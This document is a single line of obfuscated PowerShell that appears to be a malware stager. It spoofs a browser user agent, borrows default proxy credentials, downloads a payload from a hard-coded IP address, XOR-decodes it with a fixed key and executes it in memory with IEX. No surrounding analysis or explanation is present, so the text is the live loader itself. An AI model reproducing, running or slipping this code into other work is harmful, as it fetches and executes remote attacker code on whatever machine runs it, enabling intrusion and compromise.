
[SYsTEM.NEt.SERvICePoiNtMAnaGeR]::EXpECT100CONtInue = 0;$wC=NEW-ObJecT SySteM.NEt.WEBClienT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaDErS.ADD('User-Agent',$u);$Wc.PRoXy = [SystEM.Net.WeBReqUEST]::DeFAULTWebProXy;$wc.ProXY.CREDEntiALs = [SySTeM.NEt.CREdentIAlCachE]::DEFAULtNETWoRKCreDEnTiALs;$K='63a9f0ea7bb98050796b649e85481845';$I=0;[chAR[]]$B=([ChAr[]]($Wc.DOWnLoaDStrInG("http://138.121.170.12:3135/index.asp")))|%{$_-bXor$k[$i++%$k.LEngth]};IEX ($B-jOin'')

